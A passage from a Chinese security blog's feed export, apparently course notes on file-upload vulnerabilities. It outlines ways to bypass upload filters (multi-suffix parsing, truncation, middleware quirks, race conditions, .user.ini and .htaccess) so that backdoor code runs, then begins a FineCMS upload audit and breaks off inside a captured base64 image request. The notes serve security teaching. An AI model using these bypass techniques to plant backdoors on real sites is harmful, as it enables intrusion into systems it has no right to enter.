class="line">传播跨站脚本蠕虫等</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> SEC-WEB攻防-04 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SEC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SEC-2022版-0025-WEB攻防-16-通用漏洞之文件上传&amp;黑白盒审计&amp;逻辑&amp;中间件&amp;外部引用</title>
      <link href="/2023/06/26/SEC-Study-0053/"/>
      <url>/2023/06/26/SEC-Study-0053/</url>
      
        <content type="html"><![CDATA[<h1 id="总览"><a href="#总览" class="headerlink" title="总览"></a>总览</h1><h2 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h2><p>1、白盒审计三要素<br>2、黑盒审计四要素<br>3、白黑测试流程思路</p><h2 id="详细点："><a href="#详细点：" class="headerlink" title="详细点："></a>详细点：</h2><p>1、检测层面：前端，后端等<br>2、检测内容：文件头，完整性，二次渲染等<br>3、检测后缀：黑名单，白名单，MIME检测等<br>4、绕过技巧：多后缀解析，截断，中间件特性，条件竞争等</p><h2 id="本章课程内容："><a href="#本章课程内容：" class="headerlink" title="本章课程内容："></a>本章课程内容：</h2><p>1、文件上传-CTF赛题知识点<br>2、文件上传-中间件解析&amp;编辑器安全<br>3、文件上传-实例CMS文件上传安全分析</p><h2 id="前置："><a href="#前置：" class="headerlink" title="前置："></a>前置：</h2><p>后门代码需要用特定格式后缀解析，不能以图片后缀解析脚本后门代码(解析漏洞除外)<br>如：jpg图片里面有php后门代码，不能被触发，所以连接不上后门<br>如果要图片后缀解析脚本代码，一般会利用包含漏洞或解析漏洞，还有.user.ini&amp;.htaccess</p><h1 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h1><h2 id="白盒审计-Finecms-代码常规-处理逻辑"><a href="#白盒审计-Finecms-代码常规-处理逻辑" class="headerlink" title="白盒审计-Finecms-代码常规-处理逻辑"></a>白盒审计-Finecms-代码常规-处理逻辑</h2><h3 id="黑盒审计"><a href="#黑盒审计" class="headerlink" title="黑盒审计"></a>黑盒审计</h3><p>从用户中心处上传头像，发现数据包有如下数据</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">data%<span class="number">3</span>Aimage%<span class="number">2</span>Fjpeg%<span class="number">3</span>Bbase64%<span class="number">2</span>C%<span class="number">2</span>F9j%<span class="number">2</span>F4AAQSkZJRgABAQAAAQABAAD%<span class="number">2</span>F%<span class="number">2</span>FgAXR2VuZXJhdGVkIGJ5IFNuaXBhc3Rl%<span class="number">2</span>F9sAhAAKBwcIBwYKCAgICwoKCw4YEA4NDQ4dFRYRGCMfJSQiHyIhJis3LyYpNCkhIjBBMTQ5Oz4%<span class="number">2</span>BPiUuRElDPEg3PT47AQoLCw4NDhwQEBw7KCIoOzs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozv%<span class="number">2</span>FwAARCAEMAQsDAREAAhEBAxEB%<span class="number">2</span>F8QBogAAAQUBAQEBAQEAAAAAAAAAAAECAwQFBgcICQoLEAACAQMDAgQDBQUEBAAAAX0BAgMABBEFEiExQQYTUWEHInEUMoGRoQgjQrHBFVLR8CQzYnKCCQoWFxgZGiUmJygpKjQ1Njc4OTpDREVGR0hJSlNUVVZXWFlaY2RlZmdoaWpzdHV2d3h5eoOEhYaHiImKkpOUlZaXmJmaoqOkpaanqKmqsrO0tba3uLm6wsPExcbHyMnK0tPU1dbX2Nna4eLj5OXm5%<span class="number">2</span>Bjp6vHy8%<span class="number">2</span>FT19vf4%<span class="number">2</span>BfoBAAMBAQEBAQEBAQEAAAAAAAABAgMEBQYHCAkKCxEAAgECBAQDBAcFBAQAAQJ3AAECAxEEBSExBhJBUQdhcRMiMoEIFEKRobHBCSMzUvAVYnLRChYkNOEl8RcYGRomJygpKjU2Nzg5OkNERUZHSElKU1RVVldYWVpjZGVmZ2hpanN0dXZ3eHl6goOEhYaHiImKkpOUlZaXmJmaoqOkpaanqKmqsrO0tba3uLm6wsPExcbHyMnK0tPU1dbX2Nna4uPk5ebn6Onq8vP09fb3%<span class="number">2</span>BPn6%<span class="number">2</span>F9oADAMBAAIRAxEAPwD2agAoAKACgAoAKACgAoAKACgAoAKAILq%<span class="number">2</span>BtLGPzLu5igX1kcL%<span class="number">2</span>FADpOSW7NKdGpVdoRb9DBvPH%<span class="number">2</span>FAIetSQty9ww7Qxk%<span class="number">2</span>FqcD9axeIprqenSybGVN429WUv%<span class="number">2</span>BE9ubn%<span class="number">2</span>FAJBvhu%<span class="number">2</span>BuVPRiCP5A1Pt2%<span class="number">2</span>FhidH9jwh%<span class="number">2</span>FGrRX9ebQf294zn5t%<span class="number">2</span>FDcaA9PNb%<span class="number">2</span>FABYUe0rPaIfU8sj8Vdv0%<span class="number">2</span>FwCGYfbfiC3%<span class="number">2</span>FADCrBP8AgQ%<span class="number">2</span>F%<span class="number">2</span>BLo5q%<span class="number">2</span>FZB7LKF%<span class="number">2</span>Fy8l%<span class="number">2</span>FX%<span class="number">2</span>FbofbfiCv8AzC7B%<span class="number">2</span>FwDgQ%<span class="number">2</span>F8Ai6Oav2Qeyyh%<span class="number">2</span>F8vJf18g%<span class="number">2</span>Ft3xrDzP4chfHXym%<span class="number">2</span>FwY0c9ZbxD6nlkvhrNev%<span class="number">2</span>FAAyD%<span class="number">2</span>FhOr22%<span class="number">2</span>F5CPhm9t1HVhkj9VH86PbtfFEP7HpT%<span class="number">2</span>FhV4v%<span class="number">2</span>BvVlu0%<span class="number">2</span>BIPh%<span class="number">2</span>B6IDzy2xPaaM%<span class="number">2</span>FzGRVLEU2YVclxkNkn6P%<span class="number">2</span>FADsb1pqFlfpvs7uG4Hfy3DY%<span class="number">2</span>FKtVJS2Z5lWhVpO1SLXqizVGQUAFABQAUAFABQAUAFABQAUAFABQAUAFABQAUAFABQAUAFADZJEijaSR1RFGSzHAH40bDjFydktTmdQ8eafDN9l0yGXVLk8BYB8ufr3%<span class="number">2</span>FAGueVeK0jqz2KOT1pR56zUI%<span class="number">2</span>Bf9fmVPs%<span class="number">2</span>FjbXeZriLRrdv4U%<span class="number">2</span>F1mPw5%<span class="number">2</span>FUVNq099DfnyzC%<span class="number">2</span>FCnUl%<span class="number">2</span>BH9fJli1%<span class="number">2</span>BHmlI%<span class="number">2</span>FnX81zqEp%<span class="number">2</span>B8ZZCAfy5%<span class="number">2</span>FWqWHju9TKpneIa5aSUV5L%<span class="number">2</span>BvyN6z0bTLDH2Swt4SP4ljG78%<span class="number">2</span>BtaqEY7I8yriq9X45t%<span class="number">2</span>FMu1ZzhQAUAFABQAUAU7vSdOvwftdjbzE93jBP59alwjLdG9LE1qXwTa%<span class="number">2</span>BZg3nw90aZ%<span class="number">2</span>FNs2nsZRyrQyEgH6H%<span class="number">2</span>BhFYvDwe2h6dLO8TFWqWkvNFb7D400Pm0vYtXt1%<span class="number">2</span>FwCWc338fjz%<span class="number">2</span>FAOPGp5a0Nnc29tlmK%<span class="number">2</span>BOLpvutv6%<span class="number">2</span>BRYsvHlmZxa6xazaXc9xKpK%<span class="number">2</span>FnjI%<span class="number">2</span>FEY96qNdXtJWMquT1OXnoSU4%<span class="number">2</span>BW51EM0VxEssMiSxsMq6MCD%<span class="number">2</span>BIrdNPY8aUZQfLJWY%<span class="number">2</span>BmSFABQAUAFABQAUAFABQAUAFABQAUAFABQAUAFAHM6t40tra4%<span class="number">2</span>BwaTC2p3xOAkXKKfcjr%<span class="number">2</span>BH5isJ1knaOrPYw2VTnH2td8kPPcpR%<span class="number">2</span>BFdX16RbjxNqDCPOVsrc4Vfqen8z71CpSnrUfyOiWY4fCrkwcNf5n%<span class="number">2</span>FX%<span class="number">2</span>BXodPp%<span class="number">2</span>BlWGlQ%<span class="number">2</span>BVY2scC99o5b6nqfxrojCMdkeNXxFWvLmqyuXKowCgCpeapp%<span class="number">2</span>BnjN5ewQe0kgBP4VLlGO7N6WHrVf4cW%<span class="number">2</span>FRGJdfEHw9b5CXEtwR2iiP8zgVk8RTR6NPJcZPdJer%<span class="number">2</span>FwArlT%<span class="number">2</span>FhYSz%<span class="number">2</span>FAPHjoV%<span class="number">2</span>FcDt8uP5ZqfrF9os3%<span class="number">2</span>FALEcf4lWK%<span class="number">2</span>Fr5Cf8ACY68%<span class="number">2</span>FMfhC8A%<span class="number">2</span>F2i%<span class="number">2</span>F%<span class="number">2</span>FAMRR7af8gf2XhFviV%<span class="number">2</span>BH%<span class="number">2</span>BYf8ACXeIV%<span class="number">2</span>B94Ruj9C3%<span class="number">2</span>FxNHtqn8gf2Zg3tiF%<span class="number">2</span>BH%<span class="number">2</span>BYf8J5eRc3fhi%<span class="number">2</span>FhHc8n%<span class="number">2</span>Baij27W8WH9j05fBXi%<span class="number">2</span>F69WTQfEfQ5G2zpdWx7%<span class="number">2</span>BZFkD8iaaxMOpE8ixSV4tP0f%<span class="number">2</span>BZsWfiXRb%<span class="number">2</span>FAttTt2Y9FZtjH8Dg1oqkJbM8%<span class="number">2</span>BrgMVS%<span class="number">2</span>BOD%<span class="number">2</span>FP8AI060OMWgCtfadZalB5N7bRzp6OucfQ9vwqZRUlZo2o16tGXNTlZnLTeENR0aVrrwvqDxZOWtJmyjfQn%<span class="number">2</span>Bv51g6Moa02ezDM6OJXJjYX%<span class="number">2</span>FvLf8Ar0%<span class="number">2</span>B4s6Z41jNyNP122bTL0cfPxG30Pb%<span class="number">2</span>BXvTjW15Z6MyxGVS5fa4aXPH8f6%<span class="number">2</span>Fqx1AIIyDkGug8UWgAoAKACgAoAKACgAoAKACgAoAKACgCrqOpWmlWjXV7MsUS9z1J9AO5qZSUVdm1ChUrzUKauzkjLrfjdisG%<span class="number">2</span>FS9GJwXP%<span class="number">2</span>BsnH%<span class="number">2</span>Bfw%<span class="number">2</span>Btc151ttEe7y4XLFeXv1fwX9ff6HT6Roen6Hb%<span class="number">2</span>BTYwBM%<span class="number">2</span>FekPLv9T%<span class="number">2</span>FkV0QhGCsjxsTi62JlzVH8uiNCrOUhubq3s4Gnupo4Yl6u7ACk2krsunTnUlywV2cvdeO0uJza6Bp8%<span class="number">2</span>BpTf3wpCD39f5fWud17u0Fc9qnk7hHnxU1Bfj%<span class="number">2</span>FX3kX9j%<span class="number">2</span>BMNb51LVU02Fv%<span class="number">2</span>BWNt94e3H%<span class="number">2</span>FxRpclWfxOxf1rLsN%<span class="number">2</span>FBp877v%<span class="number">2</span>Bv0Rbs%<span class="number">2</span>Fh9odud9wk15IeS00h6%<span class="number">2</span>FQY%<span class="number">2</span>FXNUsPBb6mFXOsVPSDUV5L%<span class="number">2</span>FADNy10jTbLH2Wwt4SO6RAH862UIrZHm1MTWqfHNv5lyqMAoAKACgCGe0trpdtxbxTD0kQMP1pNJ7lwqThrBtehjXngjw%<span class="number">2</span>Fe5JsFhY%<span class="number">2</span>FwAUBKY%<span class="number">2</span>FAcfpWUqFN9D0KWbYyn9u%<span class="number">2</span>Frr%<span class="number">2</span>FAMEzD4N1bSvm0DXpowOkFxyv%<span class="number">2</span>BH%<span class="number">2</span>FjtZ%<span class="number">2</span>BxlH4JHb%<span class="number">2</span>FamHr6Yqin5rf%<span class="number">2</span>FAD%<span class="number">2</span>FEQeK9c0QhPEOjs0Q4%<span class="number">2</span>B1W3I%<span class="number">2</span>FHt%<span class="number">2</span>Bo%<span class="number">2</span>BlHtZw%<span class="number">2</span>BNB%<span class="number">2</span>FZ2FxOuEqa9n%<span class="number">2</span>FAFf8zo9L13TNZj3WN2kpAyU6Ov1B5reNSM9meTiMHXwztVjb8vvNCrOUpappFhrNsbe%<span class="number">2</span>Bt1lX%<span class="number">2</span>BE9GU%<span class="number">2</span>BoPaplCM1ZnRh8TVw8uak7HKGPW%<span class="number">2</span>FBDFoS%<span class="number">2</span>BqaMOqH%<span class="number">2</span>FWQD%<span class="number">2</span>FD9PpXNadHbVHtqWFzPSXuVfwf9ff6nV6Vq1lrNmt1YzCRD94dGQ%<span class="number">2</span>BhHY10wmpq6PExGGq4afJUVmXao5woAKACgAoAKACgAoAKACgAoAyte8QWfh%<span class="number">2</span>Bz864O%<span class="number">2</span>BV%<span class="number">2</span>BIoVPzSH%<span class="number">2</span>FD3rOpUUFdnbg8FUxc%<span class="number">2</span>BWG3V9jC03w9e6%<span class="number">2</span>FeLrHibp1gseioP9of0%<span class="number">2</span>FP0rKNNzfNU%<span class="number">2</span>B49KvjqWEh9Xwfzl39P69O52KqFUKoAUDAAHArpPBbbd2BIUFmIAHJJ7UCSucrqPjMy3R07w7anUbs8GQf6tPfPf9B71zyrXfLBXZ7dDKuWHtcXLkj%<span class="number">2</span>BL%<span class="number">2</span>FAK%<span class="number">2</span>B%<span class="number">2</span>FyIrXwXcajOt74nv3vJeot0bEae3H9MfjSVFyd6juXUzWFGPs8HDlXfr%<span class="number">2</span>FAF63OqtbS2soBBawRwRjosagCuhJJWR4tSrOrLmm7vzJqZmFABQAUAFABQAUAFABQAUAIQGBBAIPUGgNjnNV8EabfSfabItpt2pystvwM%<span class="number">2</span>B6%<span class="number">2</span>F4YrCdCL1WjPXw%<span class="number">2</span>BbV6S5Knvx7P%<span class="number">2</span>FP%<span class="number">2</span>FADuZ6a9rvhd1g8Q25vLPO1b2EZI%<span class="number">2</span>F3v8A6%<span class="number">2</span>BD9aj2k6ek9V3Op4PC45c2FfLL%<span class="number">2</span>BV%<span class="number">2</span>Fp%<span class="number">2</span>FX3HV2N%<span class="number">2</span>FaalbLc2U6TRN0ZT09j6H2rojJSV0eHWo1KM%<span class="number">2</span>BSorMsEZGDVGRyOreGbrS7w6z4ZPlTjma0H3JR3wP6flg1zTpOL5qZ7uGx9OvD6vjNV0l1X9d%<span class="number">2</span>FvNfw94jtdftiUBhuouJrdvvIf6itKdRTXmcONwNTCS11i9n3NitTgCgAoAKACgAoAKACgAoAyvEGv23h%<span class="number">2</span>Bw8%<span class="number">2</span>Bb55X%<span class="number">2</span>BWGEHmRv8PU1nUqKCuztwWCni6nLHRLd9jI8P%<span class="number">2</span>BHrm5vP7f8AEH7y%<span class="number">2</span>Bk5hhYfLAO3Hr7dvrWdOm2%<span class="number">2</span>Bee53Y3GwhD6rhdILd9%<span class="number">2</span>F6%<span class="number">2</span>FH0OsroPEKuo6laaTZvd3swjiTuepPoB3NTKSirs2oUKleap01dnIbdZ8dSZYyabomeB%<span class="number">2</span>FHOP6%<span class="number">2</span>FwAvrXN79byie9fDZWtPfq%<span class="number">2</span>Fgv6%<span class="number">2</span>B%<span class="number">2</span>F0Ot03SrLSLUW1jAsSDqR1Y%<span class="number">2</span>BpPc10xgoqyPCr4iriJ89R3ZcqjAKACgAoAKACgAoAKACgAoAKACgAoAKAGyRpLG0ciK6MMMrDII9xRuNNxd1ucfqHha90a6bVPC0hjbrLZMcpIPb%<span class="number">2</span>FAA%<span class="number">2</span>FIiuaVJwfNT%<span class="number">2</span>B496hmFLEw9jjVftLqv6%<span class="number">2</span>F4c1vD3ie21xWhZDbX0XEttJwR6keo%<span class="number">2</span>FlWlOqp6dThxuXzwr5k7wezNytTzjl%<span class="number">2</span>FEfhuaS4Gt6I3kanD8xC8Cceh9%<span class="number">2</span>F59DWFSm788Nz2cDj4qP1fE603%<span class="number">2</span>BBf8N%<span class="number">2</span>BIodetGyvk3cPyzwHgqfUe1VTqKa8zmx2BlhZ94vZmzWp54UAFABQAUAFABQBT1TU7bSNPlvbp9scY6d2PYD3NTKSirs3w%<span class="number">2</span>BHniKipw3ZzXhzS7nXNQ%<span class="number">2</span>FwCEm1lfmb%<span class="number">2</span>Fjztz0jXs2P5fn6VhTi5v2kvkexjsRDDU%<span class="number">2</span>FqeH%<span class="number">2</span>FAO3n3fb%<span class="number">2</span>FAD%<span class="number">2</span>B47Guk8Az9a1m00LT2u7tuBwiD7zt6ConNQV2dWFwtTFVFTh%<span class="number">2</span>Fwxzmm6JfeJ7xNZ8RLstxzbWPYD1Yf5z9OKwjB1HzT%<span class="number">2</span>B49avi6WCg8PhPi6y%<span class="number">2</span>Fy%<span class="number">2</span>FrT1OyACqFUAADAA7V1Hz7d9WLQAUAFABQAUAFABQAUAFABQAUAFABQAUAFABQAUAc94i8LrqjrqFhJ9k1SHmOZeN%<span class="number">2</span>BOzf41jUpc2q0Z6uBzB0F7Kquam91%<span class="number">2</span>FkN8OeJZL6d9K1WL7LqkHDIeBKPUfz%<span class="number">2</span>FAFHHRU6t3yy3HjsAqUVXoPmpv8PX%<span class="number">2</span>BvU6OtzyTkvE%<span class="number">2</span>BjXNldjxJoo23cPNxEBxMnfjucdf8RXNVg0%<span class="number">2</span>BeG57mX4qFSH1PEfC9n2f9f1Y3dF1i21zTY722PDcOhPKN3BraE1NXR5uLws8LVdOf%<span class="number">2</span>FDo0Ks5QoAKACgAoAQkAZJwBQBxADeOPEZY5Oi6a%<span class="number">2</span>BAO07%<span class="number">2</span>F5%<span class="number">2</span>FT61yfxp%<span class="number">2</span>BSPo3bLMLb%<span class="number">2</span>Fl7P8ABf1%<span class="number">2</span>BPoduAAAAMAdAK6z5wq6nqVtpNhLe3b7Y4x%<span class="number">2</span>BLHsB7mplJRV2b4ehPEVFTgtWcvoul3XibUV8Q62mLdebK0PQDsx%<span class="number">2</span>Fzz9MVzwi6j55%<span class="number">2</span>FI9nFYingqTwuHev2pfp%<span class="number">2</span>FW3qdnXUfPhQAUAFABQA1mCjJoAga9iU4LCgBPt8P94UAOS7ic4BFAE4IIyKAEdwgyTQBA19Ep%<span class="number">2</span>B8KAE%<span class="number">2</span>B3w%<span class="number">2</span>F3hQA9LqNzwRQBMDmgBaACgAoAKACgDA8TeGxrESXVo%<span class="number">2</span>FwBn1K2%<span class="number">2</span>BaCYHGcc7SfT%<span class="number">2</span>BVY1afPqtz08vx31duE1eEt1%<span class="number">2</span>BonhfxE2rRyWV8nkana%<span class="number">2</span>FLPEeN2ONw%<span class="number">2</span>FrRSqc2j3Q8wwKw7VSm7wls%<span class="number">2</span>F0OgrY8s4i%<span class="number">2</span>FjfwV4hGpW6n%<span class="number">2</span>Byb9ttxGo4ib1A%<span class="number">2</span>FMj8R6Vyy%<span class="number">2</span>FdT5lsz6OjJZlhvYy%<span class="number">2</span>FiQ2fdf1%<span class="number">2</span>BjO1R1kRXRgysMqwOQRXUfOtNOzHUCCgAoAKAOW8aapOIoNB085vdRO04P3I%<span class="number">2</span>B5%<span class="number">2</span>FHn8Aa560n8Ed2e1lWHjeWJq%<span class="number">2</span>FDD8%<span class="number">2</span>F6%<span class="number">2</span>FQ29H0uDRtMhsbcfLGPmbu7dyfrWsIqEbI83FYieJqupLqXWYKpZiAAMkntVnOlfRHDor%<span class="number">2</span>BO%<span class="number">2</span>FEBkbcNE098KOgnf%<span class="number">2</span>FP5D61yfxp%<span class="number">2</span>F3UfSNrK8NZfxZ%<span class="number">2</span>Fgv6%<span class="number">2</span>FH0O4ACqFUAADAA7V1nzbd9WLQAlADGmROpoAZ9ri%<span class="number">2</span>FvUAH2uL%<span class="number">2</span>B9QBVuLpJZo4Q332A4oApaz4g0XQbiO3voyHdN67Yt3GcdfwrKdWMHZnoYXLq%<span class="number">2</span>BKi5U7WRn%<span class="number">2</span>FAPCeeF%<span class="number">2</span>F7j%<span class="number">2</span>F8AgPUfWKZ1f2HjOy%<span class="number">2</span>B81dH1bSvEEMzWCECIgMTHtIJ6YrSFSM9jhxWCq4VpVOpZs71CmGYEjitDjAzpc3iQ5yDkkDvQBmap4q0DSL97G7jYTRgE7YcjkZHP41jKtCLsz08PleIxFNVIWs%<span class="number">2</span>FMqf8ACeeF%<span class="number">2</span>FwC4%<span class="number">2</span>FwD4D1P1imb%<span class="number">2</span>FANh4zsvvNixv9P1jSmv7FSsalgGKbTkVrCamro83E4aphqns6m5Ztr2N4gS1Wc5N9ri%<span class="number">2</span>FvUAKtzG3RqAJQQRxQAtABQAUAcn4t0a4jmj8RaQNt%<span class="number">2</span>FacyKo%<span class="number">2</span>F1qDrx3wPzH4Vz1oP447o9vLcVBxeEr%<span class="number">2</span>FBLbyf9fibmiavBrmlxX1vwG4dM8ow6g1rCanG6POxeGnharpy%<span class="number">2</span>FwCHRPqNhBqlhNZXK7opl2n1HoR7g805RUlZmdCtOhUVSG6Oa8G309lcXPhnUG%<span class="number">2</span>F0iyJMDH%<span class="number">2</span>BOP2%<span class="number">2</span>FMEex9qwoyabpy6Hr5pRhUjHGUtpb%<span class="number">2</span>BT%<span class="number">2</span>Fr8fU66uk8IKACgCOeeO2t5J5mCxxKXdj2AGTSbsrsqEJTkox3ZyXg%<span class="number">2</span>BCTWNTvPFF2pBmYx2qn%<span class="number">2</span>BBBwf8Pz9a56K5pOoz3cznHD0oYKHTV%<span class="number">2</span>Bv9a%<span class="number">2</span>FcdjXSeAcn4z1Gedrfw5pzf6XfnEhH8EffP15%<span class="number">2</span>FAGuetJu0I7s9vKqEIqWLq%<span class="number">2</span>FDDbzf8AX4nQ6XpsGkadDY2wxHEuM92Pcn3JraMVFWR5eIrzxFV1J7st1RgFAEczbIyaAKMklnb2D39%<span class="number">2</span>FJtiXlmOcKM47Um1FXZpSpTqzUIK7Zmf8JN4S%<span class="number">2</span>FwCf6P8A75f%<span class="number">2</span>FAArP21Pud39lY3%<span class="number">2</span>Fn3%<span class="number">2</span>BX%<span class="number">2</span>BYf8ACTeEv%<span class="number">2</span>Bf6P%<span class="number">2</span>Fvl%<span class="number">2</span>FwDCj21PuH9lY3%<span class="number">2</span>Fn3%<span class="number">2</span>BX%<span class="number">2</span>BYL4m8JLIsgvotynIOx%<span class="number">2</span>BP0o9tT7h%<span class="number">2</span>FZWN%<span class="number">2</span>F59%<span class="number">2</span>Fl%<span class="number">2</span>FmcV4%<span class="number">2</span>B1ax1fVbaawuBOiQbWYAjB3E9648ROMpJo%<span class="number">2</span>BnybDVcPRlGqrNv8AQ5auc9o7f4f67pmkWt6l%<span class="number">2</span>FdrA0jqVBUnIAPoK68PUjFO7PnM6wdfETg6Ub2udKPEnhBScXsQz6K%<span class="number">2</span>F%<span class="number">2</span>BFdPtqfc8H%<span class="number">2</span>Bysb%<span class="number">2</span>Fz7%<span class="number">2</span>FL%<span class="number">2</span>FMfF4o8Jwy%<span class="number">2</span>BbHfRK%<span class="number">2</span>BMZ2P%<span class="number">2</span>FAIUe2p9w%<span class="number">2</span>FsrG%<span class="number">2</span>FwDPv8v8zzvxjfWupeJbm6s5RLC6ptcAjOFAPWuCtJSm2j6%<span class="number">2</span>FK6M6OFjCorPX8zErI9I9E8F%<span class="number">2</span>BItG07w39jv7xIpDI5KMrHg%<span class="number">2</span>FQV20KkIws2fJ5tgMTXxPPTjdWXY2V8SeEVGFvYgP91%<span class="number">2</span>F8ACt%<span class="number">2</span>FbU%<span class="number">2</span>B55X9lY3%<span class="number">2</span>Fn3%<span class="number">2</span>BX%<span class="number">2</span>BYv%<span class="number">2</span>FCTeEv%<span class="number">2</span>Bf6P%<span class="number">2</span>FAL5f%<span class="number">2</span>FCj21PuH9lY3%<span class="number">2</span>Fn3%<span class="number">2</span>BX%<span class="number">2</span>BZc03UdC1aR4tOuFldF3MFDAgevNVGpGWzMK%<span class="number">2</span>BDr4dKVWNky9auQ7xsclCRmrOQt0AFABQAUAcQR%<span class="number">2</span>FwAIZ4tBHy6TqpwR%<span class="number">2</span>FDFJ%<span class="number">2</span>FQc%<span class="number">2</span>FkfauX%<span class="number">2</span>BFU8mfRL%<span class="number">2</span>FhRwf8A08p%<span class="number">2</span>Fiv6%<span class="number">2</span>FH1O3rqPnTkfG1nNaPaeJLJf9IsHAlA%<span class="number">2</span>FjjJ7%<span class="number">2</span>FAJ4%<span class="number">2</span>BjGuaumrTXQ93Kasailg6m09vX%<span class="number">2</span>BvyOnsryLULKG7gOY5kDr%<span class="number">2</span>BNdEWpK6PGq0pUqjpy3RPTMwoA5Px5eSvaWuiWp%<span class="number">2</span>F0jUpQhx2QEf1x%<span class="number">2</span>BANc9duygup7mT0oqcsTPaC%<span class="number">2</span>FE6SwsotOsILOAYjhQIvvjvW8YqKsjyK1WVapKpLdjrq5is7WW5nbbFChdj7AZobSV2TTpyqTUI7s5XwXay6jdXnie9X97duUgB%<span class="number">2</span>FgQccfkB%<span class="number">2</span>BHvXPRTk3UfU9vNakaMIYOntHf1%<span class="number">2</span>FrX5nYV0nghQAUAQXf8AqDQBg%<span class="number">2</span>BJ%<span class="number">2</span>F%<span class="number">2</span>BRDu%<span class="number">2</span>FwDcH%<span class="number">2</span>FoYrGv%<span class="number">2</span>FAA2ellP%<span class="number">2</span>B%<span class="number">2</span>B0%<span class="number">2</span>F66M8hrzD9BCgAoAKACgAoAKACgAoAKACgAoAKAO3%<span class="number">2</span>BF3%<span class="number">2</span>FIWvf%<span class="number">2</span>BuA%<span class="number">2</span>F9CFdeF%<span class="number">2</span>BJnznEP8GHr%<span class="number">2</span>Bh3tp%<span class="number">2</span>Fx9z%<span class="number">2</span>F8AXQ%<span class="number">2</span>FzruPjy%<span class="number">2</span>FQAUAFABQBl%<span class="number">2</span>BI9HTXNFnsiB5hG6Jj%<span class="number">2</span>FC46f4fQ1nUhzxsduBxTwteNTp19Cl4L1d9U0QRXBP2uzbyZg3XjoT%<span class="number">2</span>BH6g1NGfNHXdHRmuGVCvzQ%<span class="number">2</span>BGWqNy4t47q2kt5l3RyoUdfUEYNatXVmebCcqclOO6OV8DzyWNxqHhy5bMljIWiz3Qn%<span class="number">2</span>BXIP%<span class="number">2</span>FAq56Ds3B9D283hGrGni4bSWvr%<span class="number">2</span>FAFp8jr66TwQoA4zS%<span class="number">2</span>FwDiefEG%<span class="number">2</span>B1A%<span class="number">2</span>FNBpqeRF6buR%<span class="number">2</span>F8X%<span class="number">2</span>BYrlj79Vy7H0GI%<span class="number">2</span>FwBly2FLrPV%<span class="number">2</span>Bn9WOzrqPnzkfHl1LPDZ6Dan9%<span class="number">2</span>FqMwDeyAjr%<span class="number">2</span>BOPyNc1dtpQXU93J6cYyniZ7QX4%<span class="number">2</span>F1%<span class="number">2</span>BZ1FnaxWNnDawLtjhQIo9gK6EklZHjVakqs3OW71JqZmFABQBFcLuiIoAzrzTV1jw9NpvneUZBtL7d23DZ6ZHpUTjzRcTpwmI%<span class="number">2</span>Br1o1bXscr%<span class="number">2</span>Fwqtf%<span class="number">2</span>Bgyf%<span class="number">2</span>FAAG%<span class="number">2</span>F%<span class="number">2</span>Byrm%<span class="number">2</span>Bq%<span class="number">2</span>BZ9B%<span class="number">2</span>FrE%<span class="number">2</span>F8An3%<span class="number">2</span>BP%<span class="number">2</span>FAD%<span class="number">2</span>FAIVWv%<span class="number">2</span>FQZP%<span class="number">2</span>FgN%<span class="number">2</span>FwDZUfVfMP8AWJ%<span class="number">2</span>F8%<span class="number">2</span>B%<span class="number">2</span>Fx%<span class="number">2</span>F4BGPhjbmYwDXV80LuKeQNwHrjd0pfVle3MV%<span class="number">2</span>Fb8%<span class="number">2</span>BXm9lp6%<span class="number">2</span>F8AAOb8U%<span class="number">2</span>BHR4bvobYXRuPNi37vL245Ix1PpWFWn7N2uevl%<span class="number">2</span>BO%<span class="number">2</span>BuU3PltZ23uYlZHonSeFfCI8Sw3EhvTbeQyrjyt%<span class="number">2</span>Bcg%<span class="number">2</span>B49K3pUfaJ6nkZjmf1KUVy3v52%<span class="number">2</span>FQ3%<span class="number">2</span>FwDhVa%<span class="number">2</span>F9Bk%<span class="number">2</span>F%<span class="number">2</span>BA3%<span class="number">2</span>F2VbfVfM8z%<span class="number">2</span>FWJ%<span class="number">2</span>F8%<span class="number">2</span>B%<span class="number">2</span>Fx%<span class="number">2</span>FwCAH%<span class="number">2</span>FCq1%<span class="number">2</span>F6DJ%<span class="number">2</span>F8AAb%<span class="number">2</span>F7Kj6r5h%<span class="number">2</span>FrE%<span class="number">2</span>F8An3%<span class="number">2</span>BP%<span class="number">2</span>FAOO8QaQND1ibTxP5%<span class="number">2</span>FlhTv27c5APTJ9a5akOSXKe%<span class="number">2</span>FgsT9aoKra1zNqDrOt8N%<span class="number">2</span>BBl8QaUL46iYMuybPJ3dPfcK6adDnje54WPzd4St7Lkvp3%<span class="number">2</span>F4Brf8KrX%<span class="number">2</span>FAKDJ%<span class="number">2</span>FwDAb%<span class="number">2</span>F7KtPqvmcX%<span class="number">2</span>BsT%<span class="number">2</span>F59%<span class="number">2</span>Fj%<span class="number">2</span>FAMAP%<span class="number">2</span>BFVr%<span class="number">2</span>FwBBk%<span class="number">2</span>F8AgN%<span class="number">2</span>F9lR9V8w%<span class="number">2</span>F1if8Az7%<span class="number">2</span>FH%<span class="number">2</span>FgG14Y8Hr4aup7j7f9o82PYQYtmOc56mtaVH2bvc87MM0%<span class="number">2</span>BuQUeS1n3v%<span class="number">2</span>Bhs2YDTSyLyGckGtzxy7QAUAFABQAUAcXKP8AhHfiHHIPltNZXa3oJP8A9eP%<span class="number">2</span>B%<span class="number">2</span>BzXK%<span class="number">2</span>FwB3V8mfQR%<span class="number">2</span>F2zLWvtU%<span class="number">2</span>Fy%<span class="number">2</span>FwCG%<span class="number">2</span>FI7Suo%<span class="number">2</span>BfOM8S%<span class="number">2</span>FwDEl8YaVri%<span class="number">2</span>FLFOfs9we3pk%<span class="number">2</span>Fgf8Ax2uWp7lRTPoMB%<span class="number">2</span>FtOCq4Z7rVf1%<span class="number">2</span>FW52ddR8%<span class="number">2</span>BVNVvRp2lXV4f8AlhEzgepA4H51M5csWzfD0vbVo0%<span class="number">2</span>B7ML4f2RtvDS3D8yXkjSsT1xnA%<span class="number">2</span>Fln8ayw8bQv3PSzqrz4pwW0UkdRW54xxmmf8Tr4iX983zQ6YnkR%<span 